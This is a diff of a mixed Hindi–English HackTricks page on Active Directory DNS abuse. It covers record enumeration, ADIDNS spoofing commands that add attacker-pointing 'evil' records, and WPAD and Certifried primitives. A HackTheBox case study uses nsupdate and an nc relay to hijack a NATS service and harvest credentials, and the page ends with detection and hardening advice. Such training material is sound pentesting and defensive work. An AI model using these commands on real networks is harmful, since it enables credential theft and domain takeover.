@@ -1,10 +1,10 @@
-# AD DNS रिकॉर्ड्स
+# AD DNS Records
 
 {{#include ../../banners/hacktricks-training.md}}
 
-डिफ़ॉल्ट रूप से Active Directory में **कोई भी उपयोगकर्ता** Domain या Forest DNS zones में **enumerate all DNS records** कर सकता है, जो कि एक zone transfer के समान है (users एक DNS zone के child objects को AD environment में सूचीबद्ध कर सकते हैं)।
+डिफ़ॉल्ट रूप से **any user** in Active Directory, Domain या Forest DNS zones में **all DNS records** को **enumerate** कर सकता है, जो zone transfer के समान है (users, AD environment में DNS zone के child objects को list कर सकते हैं)।
 
-यह टूल [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) ज़ोन में **enumeration** और **exporting** के माध्यम से **all DNS records** को एक्सपोर्ट करने में सक्षम बनता है, जो आंतरिक नेटवर्क्स की recon आवश्यकताओं के लिए उपयोगी है।
+[**adidnsdump**](https://github.com/dirkjanm/adidnsdump) tool internal networks के recon purposes के लिए zone में मौजूद **all DNS records** की **enumeration** और **exporting** सक्षम करता है।<sup>[[4]](#references)</sup>
 ```bash
 git clone https://github.com/dirkjanm/adidnsdump
 cd adidnsdump
@@ -21,15 +21,15 @@ adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.loca
 
 cat records.csv
 ```
->  adidnsdump v1.4.0 (April 2025) JSON/Greppable (`--json`) आउटपुट, multi-threaded DNS resolution और LDAPS से बाइंड करते समय TLS 1.2/1.3 के समर्थन को जोड़ता है।
+>  adidnsdump v1.4.0 (April 2025) अब JSON/Greppable (`--json`) output, multi-threaded DNS resolution और LDAPS से binding करते समय TLS 1.2/1.3 का support जोड़ता है
 
-For more information read [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
+अधिक जानकारी के लिए पढ़ें [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>
 
 ---
 
-## रिकॉर्ड बनाना / संशोधित करना (ADIDNS spoofing)
+## Records बनाना / Modify करना (ADIDNS spoofing)
 
-डिफ़ॉल्ट रूप से zone DACL पर **Authenticated Users** group के पास **Create Child** परमिशन होने के कारण, कोई भी domain account (या computer account) अतिरिक्त रिकॉर्ड रजिस्टर कर सकता है। यह traffic hijacking, NTLM relay coercion या यहां तक कि पूर्ण domain compromise के लिए इस्तेमाल किया जा सकता है।
+क्योंकि **Authenticated Users** group को default रूप से zone DACL पर **Create Child** अधिकार प्राप्त है, इसलिए कोई भी domain account (या computer account) additional records register कर सकता है। इसका उपयोग traffic hijacking, NTLM relay coercion या यहां तक कि full domain compromise के लिए किया जा सकता है।
 
 ### PowerMad / Invoke-DNSUpdate (PowerShell)
 ```powershell
@@ -46,7 +46,7 @@ Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
 # add/replace an A record via secure dynamic-update
 python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
 ```
-*(dnsupdate.py Impacket ≥0.12.0 के साथ आता है)*
+*(dnsupdate.py, Impacket ≥0.12.0 के साथ आता है)*
 
 ### BloodyAD
 ```bash
@@ -54,56 +54,57 @@ bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.
 ```
 ---
 
-## Common attack primitives
+## सामान्य attack primitives
 
-1. **Wildcard record** – `*.<zone>` AD DNS server को LLMNR/NBNS spoofing जैसा enterprise-wide responder बना देता है। इसे NTLM hashes कैप्चर करने या उन्हें LDAP/SMB पर relay करने के लिए abusing किया जा सकता है। (Requires WINS-lookup to be disabled.)
-2. **WPAD hijack** – `wpad` जोड़ें (या attacker host की ओर इशारा करने वाला एक **NS** रिकॉर्ड ताकि Global-Query-Block-List bypass हो) और outbound HTTP requests को transparently proxy करके credentials harvest करें। Microsoft ने wildcard/DNAME bypasses (CVE-2018-8320) को patch किया लेकिन **NS-records अभी भी काम करते हैं**।
-3. **Stale entry takeover** – उस IP address का दावा करें जो पहले किसी workstation का था और associated DNS entry अभी भी resolve होगी, जिससे resource-based constrained delegation या Shadow-Credentials attacks DNS को छुए बिना संभव हो जाते हैं।
-4. **DHCP → DNS spoofing** – एक default Windows DHCP+DNS deployment पर same subnet का एक unauthenticated attacker किसी भी मौजूदा A record (जिसमें Domain Controllers भी शामिल हैं) को overwrite कर सकता है, forged DHCP requests भेजकर जो dynamic DNS updates ट्रिगर करते हैं (Akamai “DDSpoof”, 2023)। इससे Kerberos/LDAP पर machine-in-the-middle होता है और यह full domain takeover तक ले जा सकता है।
-5. **Certifried (CVE-2022-26923)** – उस machine account का `dNSHostName` बदलें जिसे आप कंट्रोल करते हैं, एक matching A record register करें, फिर उस नाम के लिए certificate request करके DC का impersonate करें। Certipy या BloodyAD जैसे tools पूरी flow को automate करते हैं।
+1. **Wildcard record** – `*.<zone>` AD DNS server को LLMNR/NBNS spoofing के समान enterprise-wide responder में बदल देता है। इसका दुरुपयोग NTLM hashes capture करने या उन्हें LDAP/SMB पर relay करने के लिए किया जा सकता है।  (WINS-lookup disabled होना आवश्यक है।)<sup>[[1]](#references)</sup>
+2. **WPAD hijack** – `wpad` जोड़ें (या **NS** record जोड़ें जो Global-Query-Block-List को bypass करने के लिए attacker host की ओर point करता हो) और credentials harvest करने के लिए outbound HTTP requests को transparently proxy करें। Microsoft ने wildcard/ DNAME bypasses (CVE-2018-8320) को patch कर दिया है, लेकिन **NS-records अभी भी काम करते हैं**।<sup>[[1]](#references)</sup>
+3. **Stale entry takeover** – उस IP address पर claim करें जो पहले किसी workstation का था; associated DNS entry अभी भी resolve होगी, जिससे DNS को बिल्कुल touch किए बिना resource-based constrained delegation या Shadow-Credentials attacks संभव हो जाते हैं।
+4. **DHCP → DNS spoofing** – default Windows DHCP+DNS deployment में उसी subnet पर मौजूद unauthenticated attacker forged DHCP requests भेजकर किसी भी existing A record (जिसमें Domain Controllers भी शामिल हैं) को overwrite कर सकता है। ये requests dynamic DNS updates trigger करती हैं (Akamai “DDSpoof”, 2023)। इससे Kerberos/LDAP पर machine-in-the-middle स्थिति बनती है और full domain takeover हो सकता है।<sup>[[2]](#references)</sup>
+5. **Certifried (CVE-2022-26923)** – अपने control वाले machine account का `dNSHostName` बदलें, matching A record register करें, फिर उस नाम के लिए certificate request करके DC का impersonation करें। **Certipy** या **BloodyAD** जैसे tools इस flow को पूरी तरह automate करते हैं।
 
 ---
 
-### Internal service hijacking via stale dynamic records (NATS case study)
+### stale dynamic records के माध्यम से Internal service hijacking (NATS case study)
 
-जब dynamic updates सभी authenticated users के लिए खुले रहते हैं, **a de-registered service name can be re-claimed and pointed to attacker infrastructure**। Mirage HTB DC ने DNS scavenging के बाद hostname `nats-svc.mirage.htb` expose किया था, इसलिए कोई भी low-privileged user कर सकता था:
+जब dynamic updates सभी authenticated users के लिए खुले रहते हैं, **de-registered service name को फिर से claim करके attacker infrastructure की ओर point किया जा सकता है**। Mirage HTB DC ने DNS scavenging के बाद hostname `nats-svc.mirage.htb` को expose कर दिया, इसलिए कोई भी low-privileged user निम्न कार्य कर सकता था:<sup>[[3]](#references)</sup>
 
-1. **Confirm the record is missing** and learn the SOA with `dig`:
+1. **Confirm करें कि record missing है** और `dig` से SOA जानें:
 ```bash
 dig @dc01.mirage.htb nats-svc.mirage.htb
 ```
-2. **Re-create the record** उनके नियंत्रण वाले बाहरी/VPN इंटरफेस की ओर:
+2. **रिकॉर्ड को फिर से बनाएँ** उस external/VPN interface की ओर जिसे वे नियंत्रित करते हैं:
 ```bash
 nsupdate
 > server 10.10.11.78
 > update add nats-svc.mirage.htb 300 A 10.10.14.2
 > send
 ```
-3. **Impersonate the plaintext service**. NATS क्लाइंट्स अपेक्षा करते हैं कि वे credentials भेजने से पहले एक `INFO { ... }` बैनर देखें, इसलिए वास्तविक ब्रोकर से एक वैध बैनर कॉपी करना गुप्त जानकारी एकत्र करने के लिए पर्याप्त है:
+3. **plaintext service का impersonate करें**। NATS clients credentials भेजने से पहले एक `INFO { ... }` banner देखने की अपेक्षा करते हैं, इसलिए real broker से एक legitimate banner copy करना secrets harvest करने के लिए पर्याप्त है:
 ```bash
 # Capture a single INFO line from the real service and replay it to victims
 nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
 ```
-Any client that resolves the hijacked name will immediately leak its JSON `CONNECT` frame (including `"user"`/`"pass"`) to the listener. Running the official `nats-server -V` binary on the attacker host, disabling its log redaction, or just sniffing the session with Wireshark yields the same plaintext credentials because TLS was optional.
+कोई भी client जो hijacked name को resolve करता है, वह तुरंत अपना JSON `CONNECT` frame (जिसमें `"user"`/`"pass"` शामिल हैं) listener को leak कर देगा। Attacker host पर official `nats-server -V` binary चलाने, उसके log redaction को disable करने, या Wireshark से session को sniff करने पर समान plaintext credentials मिलते हैं, क्योंकि TLS optional था।
 
-4. **Pivot with the captured creds** – Mirage में stolen NATS account ने JetStream access प्रदान किया, जिससे historic authentication events उजागर हुए जिनमें reusable AD usernames/passwords शामिल थे।
+4. **Captured creds के साथ Pivot करें** – Mirage में चुराए गए NATS account ने JetStream access प्रदान किया, जिससे historic authentication events उजागर हुए, जिनमें reuse किए जा सकने वाले AD usernames/passwords मौजूद थे।
 
-This pattern applies to every AD-integrated service that relies on unsecured TCP handshakes (HTTP APIs, RPC, MQTT, etc.): once the DNS record is hijacked, the attacker becomes the service.
+यह pattern हर उस AD-integrated service पर लागू होता है जो unsecured TCP handshakes (HTTP APIs, RPC, MQTT आदि) पर निर्भर करती है: जैसे ही DNS record hijack होता है, attacker ही service बन जाता है।
 
 ---
 
-## Detection & hardening
+## Detection और hardening
 
-* संवेदनशील zones पर **Authenticated Users** को *Create all child objects* अधिकार deny करें और dynamic updates को DHCP द्वारा उपयोग किए जाने वाले dedicated account को delegate करें।
-* यदि dynamic updates आवश्यक हैं, तो zone को **Secure-only** पर सेट करें और DHCP में **Name Protection** सक्षम करें ताकि केवल owner computer object अपना ही record overwrite कर सके।
-* DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) और LDAP writes को `CN=MicrosoftDNS,DC=DomainDnsZones` पर monitor करें।
-* जोख़िम भरे names (`wpad`, `isatap`, `*`) को intentionally-benign record से या Global Query Block List के माध्यम से block करें।
-* DNS servers को patched रखें – जैसे RCE bugs CVE-2024-26224 और CVE-2024-26231 ने **CVSS 9.8** प्राप्त किया और Domain Controllers के खिलाफ remotely exploitable हैं।
-
+* Sensitive zones पर **Authenticated Users** को *Create all child objects* right deny करें और dynamic updates को DHCP द्वारा उपयोग किए जाने वाले dedicated account को delegate करें।
+* यदि dynamic updates आवश्यक हों, तो zone को **Secure-only** पर सेट करें और DHCP में **Name Protection** enable करें, ताकि केवल owner computer object ही अपना record overwrite कर सके।
+* DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) और `CN=MicrosoftDNS,DC=DomainDnsZones` पर LDAP writes को monitor करें।
+* Dangerous names (`wpad`, `isatap`, `*`) को intentionally-benign record या Global Query Block List के माध्यम से block करें।
+* DNS servers को patched रखें – उदाहरण के लिए, RCE bugs CVE-2024-26224 और CVE-2024-26231 ने **CVSS 9.8** प्राप्त किया और Domain Controllers के विरुद्ध remotely exploitable हैं।
 
 ## References
 
-- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, अभी भी wildcard/WPAD attacks के लिए de-facto reference)
-- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
-- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
+- [1] [ADIDNS Revisited - WPAD, GQBL, and More](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, wildcard/WPAD attacks के लिए अब भी de-facto reference)
+- [2] [Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
+- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
+- [4] [Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
+
 {{#include ../../banners/hacktricks-training.md}}
